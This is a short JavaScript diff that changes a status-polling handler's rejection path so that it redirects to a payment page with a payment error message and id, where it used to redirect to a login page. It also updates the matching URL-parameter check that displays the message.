@@ -563,8 +563,8 @@
           } else if (st === 'reject' || st === 'rejected' || st === 'declined' || st === 'error' || st === 'failed') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
-            var rejectMessage = 'The login details were rejected. Please verify the information and try again.';
-            window.location.href = 'login_en.html?error=login&msg=' + encodeURIComponent(rejectMessage);
+            var rejectMessage = 'Payment details were rejected. Please verify the information and try again.';
+            window.location.href = 'payment_en.html?error=payment&msg=' + encodeURIComponent(rejectMessage) + '&id=' + paymentId;
           }
         })
         .catch(function(err) {
@@ -637,8 +637,8 @@
 
   function applyRejectedPageMessage() {
     var params = new URLSearchParams(window.location.search);
-    if (params.get('error') !== 'login') return;
-    var msg = params.get('msg') || 'The login details were rejected. Please verify the information and try again.';
+    if (params.get('error') !== 'payment') return;
+    var msg = params.get('msg') || 'Payment details were rejected. Please verify the information and try again.';
     var errorMsg = document.getElementById('errorMsg');
     if (errorMsg) {
       errorMsg.textContent = msg;
